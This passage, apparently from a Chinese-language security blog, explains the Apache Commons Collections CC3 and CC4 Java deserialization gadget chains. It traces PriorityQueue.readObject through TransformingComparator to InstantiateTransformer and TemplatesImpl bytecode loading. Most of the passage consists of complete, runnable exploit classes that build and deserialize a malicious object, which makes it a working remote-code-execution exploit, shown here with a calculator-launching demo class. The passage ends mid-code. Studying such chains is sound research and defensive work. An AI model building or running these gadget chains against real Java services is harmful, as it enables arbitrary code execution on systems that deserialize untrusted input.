构造 setValue 的可控参数  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>)); <span class="hljs-comment">// 防止在反序列化前弹计算器  </span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> lazyMap.remove(<span class="hljs-string">&quot;key&quot;</span>);  <br>  <br> <span class="hljs-comment">// 在 put 之后通过反射修改值  </span><br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br> factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> factoryField.set(lazyMap, chainedTransformer);  <br>  <br> serialize(expMap);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p><code>CC4</code>简单说就是找了条其它的路实现<code>transform</code>方法</p><p>CC4 链上去掉了 InvokerTransformer 的 Serializable 继承，这里找除了它谁还调用了<code>transform</code>方法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">InstantiateTransformer 下存在 <span class="hljs-attribute">transform</span>方法<br></code></pre></td></tr></table></figure><p>在 <code>TransformingComparator</code> 这个类中的 <code>compare()</code> 方法调用了 <code>transform()</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformingComparator.java </span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>去找谁调用了这个<code>compare</code>方法：</p><p><code>riorityQueue</code> 这个类中的 <code>siftDownUsingComparator()</code> 方法调用了之前的 <code>compare()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.java</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> queue[child];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//注意这里</span><br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure><p>同类下的<code>siftDown</code>调用了这个<code>siftDownUsingComparator</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>siftDown</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后再重写的<code>PriorityQueue.readObject()</code>存在调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>       <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br><br>       s.defaultReadObject();<br><br>       s.readInt();<br><br>       queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>           queue[i] = s.readObject();<br><br>       heapify();<br>   &#125;<br></code></pre></td></tr></table></figure><p>逻辑：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject() -&gt;</span> heapify<br><span class="hljs-function"><span class="hljs-title">heapify</span> -&gt;</span> siftDown<br><span class="hljs-function"><span class="hljs-title">siftDown</span> -&gt;</span>siftDownUsingComparator<br><span class="hljs-function"><span class="hljs-title">siftDownUsingComparator</span>-&gt;</span>compare<br><span class="hljs-function"><span class="hljs-title">compare</span> -&gt;</span>transformer.transform()<br></code></pre></td></tr></table></figure><p>链子的尾部就是<code>InstantiateTransformer.transform()</code>，这里直接用前面<code>CC3</code>那部分就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// 构造 InstantiateTransformer.transform 的 EXPpublic class TransformOriEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br>  <br> instantiateTransformer.transform(TrAXFilter.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>按照前面的逻辑，把<code>instantiateTransformer.transform(TrAXFilter.class); </code>换个方法执行：</p><p><code>compare</code>方法去调这个<code>transform</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComparatorEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>简单说就是下面这个东西和反序列化配合就能调用<code>instantiateTransformer.transform(TrAXFilter.class);  </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator); <br></code></pre></td></tr></table></figure><p>为啥呢？注意这段构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer)</span> &#123;<br>        <span class="hljs-built_in">this</span>(transformer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComparableComparator</span>());<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructs an instance with the given Transformer and Comparator.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformer  what will transform the arguments to &lt;code&gt;compare&lt;/code&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> decorated  the decorated Comparator</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer transformer, Comparator decorated)</span> &#123;<br>        <span class="hljs-built_in">this</span>.decorated = decorated;<br>        <span class="hljs-built_in">this</span>.transformer = transformer;<br>    &#125;<br><span class="hljs-comment">//在Java中，通过使用 this() 关键字可以在一个构造函数中调用同一个类的另一个构造函数</span><br><span class="hljs-comment">//说白了这里就是给transformer赋值成chainedTransformer，然后去调它的transform方法</span><br></code></pre></td></tr></table></figure><p>但这里序列化后反序列化是不会弹计算器的，问题出在：</p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/">参考文章</a></p><p>简单讲就是这个优先队列的长度得是2，才能进<code>SitDown</code>方法里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-comment">// TransformingComparator.compare 的 EXPpublic class ComparatorEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> 